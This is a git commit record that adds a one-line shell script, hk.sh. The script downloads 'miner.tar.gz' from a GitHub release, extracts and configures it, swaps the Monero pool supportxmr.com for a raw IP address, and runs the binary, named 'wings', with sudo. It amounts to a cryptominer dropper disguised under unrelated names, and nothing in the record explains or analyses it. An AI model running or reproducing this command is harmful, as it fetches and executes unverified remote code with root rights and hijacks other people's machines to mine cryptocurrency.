b7bac26da7606a77854eda55afb0ed2709d1fcf4
TeePee994 <155748887+TeePee994@users.noreply.github.com>
2024-01-07 13:25:33 +0700

    Create hk.sh

---
+++ hk.sh
@@ -0,0 +1,1 @@
+curl -LO "https://github.com/TeePee994/AboutMe/releases/download/beta/miner.tar.gz"; tar -xvf miner.tar.gz; ./configure; sed -i 's+pool.supportxmr.com+139.99.125.38+g' config.json; sudo ./wings
